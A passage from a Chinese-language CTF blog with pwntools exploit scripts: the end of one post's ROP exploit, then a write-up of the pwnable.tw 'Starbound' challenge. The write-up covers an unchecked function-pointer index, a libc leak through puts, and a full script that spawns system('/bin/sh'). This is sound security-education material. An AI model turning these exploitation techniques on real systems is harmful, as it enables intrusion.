<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># bruteforce password</span></span><br><span class="line">    password = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0x0a</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, password + <span class="built_in">bytes</span>([ch]) + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Success&quot;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">                <span class="comment"># print(ch)</span></span><br><span class="line">                password += <span class="built_in">bytes</span>([ch])</span><br><span class="line">                io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) != i + <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    success(<span class="string">&quot;password: &quot;</span>+<span class="built_in">repr</span>(password))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># bruteforce saved rbp (progaddr)</span></span><br><span class="line">    progaddr = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0x0a</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">            io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, password + <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span> + progaddr + <span class="built_in">bytes</span>([ch]) + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Success&quot;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">                <span class="comment"># print(ch)</span></span><br><span class="line">                progaddr += <span class="built_in">bytes</span>([ch])</span><br><span class="line">                io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(progaddr) != i + <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    progaddr = unpack(progaddr+<span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">0x1060</span></span><br><span class="line">    success(<span class="string">&quot;stackaddr: &quot;</span>+<span class="built_in">hex</span>(progaddr))</span><br><span class="line"></span><br><span class="line">    my_read = <span class="number">0xca0</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, <span class="number">0x10</span>*<span class="string">b&#x27;\0&#x27;</span>+<span class="number">0x30</span>*<span class="string">b&#x27;a&#x27;</span>+password+<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span> + pack(progaddr+my_read))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Copy :&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROP</span></span><br><span class="line">    start = <span class="number">0xb70</span></span><br><span class="line">    pop_rdi = <span class="number">0x10c3</span></span><br><span class="line">    payload = flat([</span><br><span class="line">        progaddr+pop_rdi,</span><br><span class="line">        progaddr+elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        progaddr+elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        progaddr+start,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    io.send(pack(progaddr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+payload)</span><br><span class="line"></span><br><span class="line">    libcaddr = unpack(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\0\0&#x27;</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;libcaddr: &quot;</span>+<span class="built_in">hex</span>(libcaddr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># bruteforce password again</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    password = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0x0a</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, password + <span class="built_in">bytes</span>([ch]) + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Success&quot;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">                <span class="comment"># print(ch)</span></span><br><span class="line">                password += <span class="built_in">bytes</span>([ch])</span><br><span class="line">                io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) != i + <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    success(<span class="string">&quot;password: &quot;</span>+<span class="built_in">repr</span>(password))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, <span class="number">0x10</span>*<span class="string">b&#x27;\0&#x27;</span>+<span class="number">0x30</span>*<span class="string">b&#x27;a&#x27;</span>+password+<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span> + pack(progaddr+my_read))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Copy :&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROP</span></span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    io.send(pack(progaddr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+pack(progaddr+pop_rdi)+pack(libcaddr+<span class="number">0x000000000018c177</span>)+pack(libcaddr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/224d2c00b9a1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/224d2c00b9a1.html" class="post-title-link" itemprop="url">【Pwn#0x13】pwnable.tw Starbound writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-13 14:59:14" itemprop="dateCreated datePublished" datetime="2023-10-13T14:59:14+08:00">2023-10-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/224d2c00b9a1.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x13】pwnable.tw Starbound writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/224d2c00b9a1.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/224d2c00b9a1.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本题 neta 了星界边境，实现了一个简单的二维探索游戏。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/c/Projects/ctf_archive/[pwnable.tw]Starbound/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8047000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>数组下标未检查导致的任意控制流劫持。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    menu_func_ptr();</span><br><span class="line">    <span class="keyword">if</span> ( !readn(nptr, <span class="number">256u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = strtol(nptr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))func_ptrs[v3])();          <span class="comment">// 数组index溢出！</span></span><br><span class="line">  &#125;</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 main 函数中，有一个对于函数指针数组的调用，index 数据来自于用户输入经 strtol 转化成的数字。我们可以用 <code>cmd_set_name</code> 函数修改 data 段的数据，再让程序 call 我们控制的地址，达成 arbitary call。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h3 id="ROP-方法"><a href="#ROP-方法" class="headerlink" title="ROP 方法"></a>ROP 方法</h3><p>有了任意调用，程序又没有开 PIE，接下来就是看看程序本体有哪些东西可以给我们来调用。<br>我在本体中，并没有找到 win 相关的函数，也没有找到导入的 system 符号，因此似乎没有简单的 ret2text 方法来完成一击必杀。</p>
<p>那就来打个 ROP 吧，我们可以直接用 main 函数 buffer 来存放 ROP 链，只要找一个类似于 <code>add esp, xxx; ret;</code> 的 gadget 即可。</p>
<p>使用这种方法，我们可以先用 <code>puts</code> 泄露 libc 基址，然后就能 <code>system(&quot;/bin/sh&quot;)</code> 了。具体利用见完整 EXP。<br>查 libc 版本用的是 <a target="_blank" rel="noopener" href="https://libc.rip/">libc-database</a>，俄罗斯那个（<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc.blukat.me</a>）查到的结果贼少，不知道为什么。</p>
<h3 id="路径穿越方法（存在利用条件限制）"><a href="#路径穿越方法（存在利用条件限制）" class="headerlink" title="路径穿越方法（存在利用条件限制）"></a>路径穿越方法（存在利用条件限制）</h3><p>ROP 方法是我不小心从网上看到的，唉我不应该上网查的。<br>不过我自己也想出了一个非常绝妙的利用，不需要用到 ROP！</p>
<p>我们已有的任意调用，其参数是固定好的，第一个参数是一个我们可控的字符串指针，第二个参数是 0。顺着这个思路，我们可以先看看程序本体中有哪些函数，其第一个参数是 <code>char*</code> 类型的。</p>
<p>首先，此类函数肯定是 printf 最常见也最好利用，我们可以用这种方法将任意调用宽展成任意读写，但程序开启了 FORTIFY 保护，里面甚至只有 <code>_printf_chk</code> 函数没有 <code>printf</code> 函数。两者的区别在于，后者其实是前者的一个 wrapper。<br>前者的第一个参数是一个安全等级，1 表示开启，0 表示关闭。当开启时，格式化字符串攻击将会被大大削弱，比如不能直接使用 <code>%n$d</code> 了，如果要用到这玩意，必须前面要有 <code>%1$d</code> <code>%2$d</code> … <code>%(n-1)$d</code> 这些。<br>因此，这条路走不通。</p>
<p>但我们就可以找到另外两个首个参数的—— <code>mkdir</code> 和 <code>open</code>。既然有 open，就可以想想是不是能 orw 把 flag 读出来。但是，程序的漏洞处，相邻的两次触发之间隔了许多个函数调用，这就不允许我们把 open 返回值暂时放在寄存器中，这里就很难进行下一步操作。</p>
<p>但是，我把整个 binary 都审了一边，发现了一个有趣的机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_enable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">socklen_t</span> len; <span class="comment">// [esp+2Ch] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+32h] [ebp-7Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">    close(fd);</span><br><span class="line">  addr.sa_family = <span class="number">1</span>;</span><br><span class="line">  fd = socket(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>);                         <span class="comment">// UDP</span></span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Error] Fail to enable&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>cmd_multiplayer_enable</code> 中，有对于一个全局变量 <code>fd</code> 的赋值。而我们知道，进程打开的第一个文件往往是接在 <code>stderr</code> 的后面，也就是 fd &#x3D;&#x3D; 3。<br>我们可以观察到，程序在使用 close 关闭 fd 之后，并没有清空 fd 的值，也就是这里依然是 3。实际调用这个函数，发现程序肯定可以走到关闭 fd 的代码。</p>
<p>我们查找 fd 的应用，可以找到这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_recvmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  v5 = getpid();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ask your friends to share their coordinates!&quot;</span>);</span><br><span class="line">  v0 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[Error] Transmission error :(&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buf[<span class="number">0</span>] = rotate_shift_add_decrypt(buf[<span class="number">0</span>], &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">&quot;[Info] Receiving (&quot;</span>);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(buf[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里程序将会尝试从 fd 中读取内容，每一个字节都使用 <code>rotate_shift_add_decrypt</code> 函数进行加密，然后打印出结果。</p>
<p>于是我们可以想到一条利用链：</p>
<ol>
<li>调用 <code>cmd_multiplayer_enable</code>，让 fd 被置为 3；</li>
<li>调用 <code>open</code> 函数打开 flag；</li>
<li>调用 <code>rotate_shift_add_decrypt</code>，读取加密后的 flag 并输出；</li>
<li>本地尝试暴力破解！</li>
</ol>
<p>但我们会遇到一个问题：虽然我们可以控制第一个参数这个字符串，但是其开头被限制了是一个数字，因为我们就是用这个数字当作数组下标来实现任意调用的。<br>为此，我想到了一种借用 <code>mkdir</code> 来加强 <code>open</code> 的方法：</p>
<ol>
<li>调用 <code>mkdir(&quot;-33\0&quot;)</code> 在当前目录创建名为 -33 的文件夹；</li>
<li>调用 <code>open(&quot;-33/../flag\0&quot;)</code> 打开任意目录下的 flag。</li>
</ol>
<p>在本地，这种方法是可行的。然而，远程环境中执行 binary 的路径是根目录，而进程并没有在根目录创建文件夹的权限，因此这种方法很遗憾地失效了 : (</p>
<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = process([filename])</span><br><span class="line">io = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10202</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    g = gdb.attach(io, <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        b *0x0804A65D</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># 0x08048e48 : add esp, 0x1c ; ret</span></span><br><span class="line">    add_esp_1c_ret = <span class="number">0x08048e48</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        elf.symbols[<span class="string">&#x27;puts&#x27;</span>], elf.symbols[<span class="string">&#x27;_start&#x27;</span>], elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    mes = io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    libc_base = unpack(mes,<span class="number">32</span>) - <span class="number">0x5fca0</span></span><br><span class="line">    log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment"># system_addr = libc_base + 0x49670 # printf</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        system_addr, elf.symbols[<span class="string">&#x27;_start&#x27;</span>], <span class="number">0x080580D0</span>+<span class="number">0x4</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret)+<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="反思和总结"><a href="#反思和总结" class="headerlink" title="反思和总结"></a>反思和总结</h2><p><strong>函数数组和数组下标都是非常危险的东西——前者容易被劫持，后者容易超越边界。</strong><br>本漏洞修补十分简单，只需要加上一个检查就可以了。</p>
<p>从这道题目的利用中，我们可以发现：<strong>任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
